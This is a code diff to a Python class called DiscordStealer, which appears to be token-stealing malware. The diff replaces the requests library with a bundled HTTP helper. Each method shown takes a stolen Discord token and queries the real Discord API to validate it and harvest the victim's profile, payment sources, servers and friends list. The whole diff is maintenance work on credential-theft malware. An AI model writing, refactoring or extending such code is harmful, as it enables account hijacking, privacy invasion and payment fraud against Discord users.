@@ -172,21 +172,17 @@ class DiscordStealer:
 
     def verify_token(self, token):
         try:
-            import requests
-            headers = {'Authorization': token, 'Content-Type': 'application/json'}
-            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
-            return r.status_code == 200
+            code, _ = utils.http_get('https://discord.com/api/v9/users/@me', {'Authorization': token, 'Content-Type': 'application/json'}, 10)
+            return code == 200
         except:
             return False
 
     def get_token_info(self, token):
         try:
-            import requests
-            headers = {'Authorization': token, 'Content-Type': 'application/json'}
-            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
-            if r.status_code != 200:
+            code, data = utils.http_get('https://discord.com/api/v9/users/@me', {'Authorization': token, 'Content-Type': 'application/json'}, 10)
+            if code != 200:
                 return None
-            user = r.json()
+            user = json.loads(data.decode('utf-8'))
             info = {
                 'id': user.get('id', ''),
                 'username': user.get('username', '') + '#' + user.get('discriminator', '0'),
@@ -233,12 +229,10 @@ class DiscordStealer:
 
     def get_billing(self, token):
         try:
-            import requests
-            headers = {'Authorization': token, 'Content-Type': 'application/json'}
-            r = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers, timeout=10)
-            if r.status_code != 200:
+            code, data = utils.http_get('https://discord.com/api/v9/users/@me/billing/payment-sources', {'Authorization': token, 'Content-Type': 'application/json'}, 10)
+            if code != 200:
                 return 'Locked'
-            sources = r.json()
+            sources = json.loads(data.decode('utf-8'))
             if not sources:
                 return 'None'
             bills = []
@@ -253,12 +247,10 @@ class DiscordStealer:
 
     def get_guilds(self, token):
         try:
-            import requests
-            headers = {'Authorization': token, 'Content-Type': 'application/json'}
-            r = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers=headers, timeout=10)
-            if r.status_code != 200:
+            code, data = utils.http_get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', {'Authorization': token, 'Content-Type': 'application/json'}, 10)
+            if code != 200:
                 return [], []
-            guilds = r.json()
+            guilds = json.loads(data.decode('utf-8'))
             hq = []
             all_g = []
             for g in guilds:
@@ -274,12 +266,10 @@ class DiscordStealer:
 
     def get_friends(self, token):
         try:
-            import requests
-            headers = {'Authorization': token, 'Content-Type': 'application/json'}
-            r = requests.get('https://discord.com/api/v9/users/@me/relationships', headers=headers, timeout=10)
-            if r.status_code != 200:
+            code, data = utils.http_get('https://discord.com/api/v9/users/@me/relationships', {'Authorization': token, 'Content-Type': 'application/json'}, 10)
+            if code != 200:
                 return []
-            friends = r.json()
+            friends = json.loads(data.decode('utf-8'))
             result = []
             for f in friends:
                 if f.get('type') == 1:
